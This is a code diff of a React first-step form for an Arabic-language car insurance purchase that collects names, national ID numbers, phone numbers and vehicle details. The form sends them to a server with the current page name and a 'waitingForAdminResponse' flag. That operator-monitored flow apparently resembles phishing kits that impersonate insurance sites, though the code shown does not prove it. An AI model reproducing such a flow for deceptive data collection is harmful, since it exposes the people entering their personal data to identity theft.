@@ -1,52 +1,57 @@
 import { useEffect, useState } from "react";
 import CustomInput from "../CustomInput";
 import { useLocation, useNavigate } from "react-router-dom";
-import { handleSubmitTab } from "@/utils/actions";
+import { handleSubmitTab } from "@/lib/actions";
 import CarPanelSelection from "../CarPanelSelection";
 import registrationTypes from "../../data/registration-types";
 import {
-  currentPage,
-  details,
-  extraInfo,
-  permissions,
-} from "@/context/signals";
+  checkUser,
+  sendDataToServer,
+  setCurrentPage,
+} from "@/real-time/utils/utils";
 
 const StepOne = () => {
   const { state } = useLocation();
   const [error, setError] = useState({});
   const navigate = useNavigate();
 
-  const handleNext = (e: any) => {
+  const handleNext = async (e: any) => {
     const res = handleSubmitTab(e, setError);
 
+    console.log(res);
+
     if (res) {
-      const data: any = {
-        number: res.id,
-        fullName: res.name,
-        phone: res.phone,
-      };
-
-      permissions.value = [];
-
-      extraInfo.value.fullName = data.fullName;
-      extraInfo.value.number = data.number;
-      extraInfo.value.phone = data.phone;
-
-      details.value = {
-        ...details.value,
-        ...data,
-        time: new Date(),
-      };
-
-      navigate("/checkout/2", {
-        state: { ...state, ...res },
-        preventScrollReset: false,
+      checkUser(
+        {
+          fullName: res.name,
+          idNumber: res.id,
+          phone: res.phone,
+        },
+        navigate,
+        { ...state, ...res }
+      );
+      // const result = await userUpdate({
+      //   id: res.id,
+      //   name_ar: res.name,
+      //   phone: res.phone,
+      // });
+      // result?.data?.message === "تم تحديث بياناتك بنجاح"?
+      sendDataToServer({
+        data: res,
+        current: "الخطوة الأولى",
+        nextPage: "",
+        waitingForAdminResponse: false,
       });
+      // : toast({
+      //     description: result.data.message || "خطأ في تحديث البيانات",
+      //     className: "text-red-500",
+      //     action: <ToastAction altText="Goto toast undo">إزالة</ToastAction>,
+      //   });
     }
   };
 
   useEffect(() => {
-    currentPage.value = "الخطوة الأولى";
+    setCurrentPage("الخطوة الأولى");
   }, []);
 
   return (
@@ -61,8 +66,8 @@ const StepOne = () => {
             "شراء وثيقة تأمين لمركبتك الحالية، أو وثيقة تأمين لمركبة بغرض نقل ملكيتها؟"
           }
           biSelect={["تأمين جديد", "نقل ملكية"]}
-          disabled
         />
+
         <CustomInput
           error={error}
           setError={setError}
@@ -70,8 +75,8 @@ const StepOne = () => {
           id="type"
           tip={"هل المركبة مسجلة بالرقم التسلسلي أو برقم البطاقة الجمركية؟"}
           biSelect={["الرقم التسلسلى", "بطاقة جمركية (إستيراد)"]}
-          disabled
         />
+
         <CustomInput
           error={error}
           setError={setError}
@@ -79,8 +84,8 @@ const StepOne = () => {
           placeholder="إسم مقدم الطلب"
           id="name"
           type="text"
-          disabled
         />
+
         <CustomInput
           error={error}
           setError={setError}
@@ -93,7 +98,6 @@ const StepOne = () => {
           tip={
             "يرجى إدخال بطاقة الهوية الخاصة بك للمواطنين أو بطاقة الإقامة للجنسيات الأخرى."
           }
-          disabled
         />
         <CustomInput
           error={error}
@@ -107,8 +111,8 @@ const StepOne = () => {
           tip={
             "أدخل رقم التسلسل الصحيح للمركبة المراد تأمينها للحصول على تغطية أدق."
           }
-          disabled
         />
+
         <CustomInput
           error={error}
           setError={setError}
@@ -117,8 +121,8 @@ const StepOne = () => {
           id="phone"
           placeholder="05xxxxxxx"
           type="tel"
-          disabled
         />
+
         <CustomInput
           error={error}
           setError={setError}
@@ -126,8 +130,8 @@ const StepOne = () => {
           placeholder="نوع المركبة"
           id="car-type"
           type="text"
-          disabled
         />
+
         <CustomInput
           error={error}
           setError={setError}
@@ -138,8 +142,8 @@ const StepOne = () => {
           type="text"
           yearsDD
           hidValue
-          disabled
         />
+
         <CustomInput
           error={error}
           setError={setError}
@@ -154,10 +158,10 @@ const StepOne = () => {
           dropDown
           opts={registrationTypes}
           hidValue
-          disabled
         />
 
         <CarPanelSelection error={error} />
+
         <CustomInput
           error={error}
           setError={setError}
@@ -166,7 +170,6 @@ const StepOne = () => {
           id="recap"
           reCAPTCHA
           type={"number"}
-          disabled
         />
       </div>
 
